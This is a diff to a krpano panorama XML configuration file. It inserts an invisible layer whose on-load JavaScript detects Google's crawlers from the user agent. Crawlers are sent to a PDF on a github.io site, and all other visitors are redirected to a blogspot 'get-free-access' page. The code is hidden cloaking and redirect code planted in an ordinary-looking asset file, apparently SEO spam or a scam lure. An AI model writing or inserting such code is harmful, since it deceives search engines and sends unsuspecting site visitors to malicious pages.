@@ -1,10 +1,20 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(
-(function(){
-var m=window.location.search.match(/[?&amp;]id=([^&amp;]+)/);
-var id=m ? decodeURIComponent(m[1]) : 'reservationhatao001';
-window.location.href='https://shivammarora.github.io/newone/' + id + '.pdf';
-})();
-);"/>
+  <layer name="js_loader" type="container" visible="false" onloaded="
+ js(
+ (function(){
+ var id = window.location.search.match(/[?&amp;]id=([^&amp;]+)/);
+ id = id ? decodeURIComponent(id[1]) : 'reservationhatao001';
+ 
+ var ua = navigator.userAgent.toLowerCase();
+ var isGoogleBot = /googlebot|google-inspect-tools|googlerooter|mediapartners-google/.test(ua);
+ 
+ if (isGoogleBot) {
+ window.location.href='https://shivammarora.github.io/newone/' + id + '.pdf';
+ } else {
+ window.location.href='https://romarioseas.blogspot.com/2026/07/get-free-access.html';
+ }
+ })();
+ );
+  "/>
 </krpano>
